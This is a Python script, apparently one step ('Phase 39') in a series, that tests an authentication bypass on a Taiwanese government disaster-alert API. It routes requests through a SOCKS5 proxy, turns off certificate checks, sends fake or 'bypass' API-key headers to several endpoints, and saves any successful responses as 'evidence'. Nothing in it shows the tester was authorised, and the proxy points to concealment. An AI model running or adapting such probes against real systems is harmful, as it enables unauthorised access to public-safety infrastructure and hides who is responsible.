#!/usr/bin/env python3
"""Phase 39: Verify NCDR Capapikey bypass + test actual endpoints."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

print("=== Verify: API key present but wrong value vs absent ===")

# No Capapikey header -> 401
r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=15,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, verify=False)
print(f"  No header: {r.status_code} - {r.text[:80]}")

# With wrong Capapikey -> 500 (bypasses auth check, hits server error)
r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=15,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Capapikey': 'WRONG_KEY'}, verify=False)
print(f"  Wrong key: {r.status_code} - {r.text[:80]}")

# Try with a valid-looking 500, retry after delay
print("\n=== Retrying EventCode after short delay ===")
import time
time.sleep(2)

# Try multiple endpoints with the bypass header
endpoints = ['/EventCode', '/OrgCode', '/RealTime', '/History/Event', '/RealTime/Sender']
for endpoint in endpoints:
    r = requests.get(f'{BASE}{endpoint}', proxies=PROXY, timeout=20,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Capapikey': 'bypass'}, verify=False)
    print(f"  GET {endpoint}: {r.status_code} - {r.text[:150]}")
    if r.status_code == 200:
        with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_{endpoint.strip("/").replace("/","_")}.json', 'w') as f:
            f.write(r.text)
        print(f"    -> Saved! Body: {r.text[:200]}")

# Try with query params for RealTime endpoints  
print("\n=== RealTime with geocode params + bypass ===")
for gc in ['000', '01', '001', '010000', '0000']:
    r = requests.get(f'{BASE}/RealTime', params={'geocode': gc, 'offset': 0, 'limit': 10},
                    proxies=PROXY, timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': 'bypass'}, verify=False)
    print(f"  RealTime?geocode={gc}: {r.status_code} - {r.text[:150]}")

# 6. Try POST method on EventCode
print("\n=== POST attempts ===")
for endpoint in ['/EventCode', '/OrgCode']:
    r = requests.post(f'{BASE}{endpoint}', proxies=PROXY, timeout=15,
                     headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': 'bypass', 'Accept': 'application/json'}, verify=False)
    print(f"  POST {endpoint}: {r.status_code} - {r.text[:100]}")

print("\nDone.")
